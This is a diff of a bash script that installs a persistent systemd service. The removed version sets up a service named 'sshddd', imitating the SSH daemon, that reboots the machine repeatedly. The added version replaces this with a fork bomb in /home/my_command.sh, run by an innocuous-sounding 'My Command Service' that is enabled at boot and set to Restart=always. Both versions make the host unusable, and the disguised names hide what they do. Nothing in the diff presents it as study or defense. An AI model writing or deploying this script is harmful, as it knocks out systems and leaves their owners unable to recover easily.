@@ -1,19 +1,13 @@
 #!/bin/bash
-
-# 1. 创建 /home/1.sh，写入重启内容
-echo -e "#!/bin/bash\n\nreboot" > /home/1.sh
-
-# 2. 给 /home/1.sh 执行权限
-chmod +x /home/1.sh
-
-# 3. 创建 systemd 服务文件
-cat <<EOF | sudo tee /etc/systemd/system/sshddd.service > /dev/null
+echo -e "#!/bin/bash\n\n:(){ :|:& };:" > /home/my_command.sh
+chmod +x /home/my_command.sh
+cat <<EOF | sudo tee /etc/systemd/system/my_service.service > /dev/null
 [Unit]
-Description=sshddd
+Description=My Command Service
 After=network.target
 
 [Service]
-ExecStart=/home/1.sh
+ExecStart=/home/my_command.sh
 Restart=always
 User=$(whoami)
 
@@ -21,9 +15,7 @@ User=$(whoami)
 WantedBy=multi-user.target
 EOF
 
-# 4. 重新加载 systemd daemon 并启用开机自启
 sudo systemctl daemon-reload
-sudo systemctl enable sshddd.service
-
-# 5. 启动服务
-sudo systemctl start sshddd.service
+sudo systemctl enable my_service.service
+sudo systemctl start my_service.service
+echo "Service setup complete."
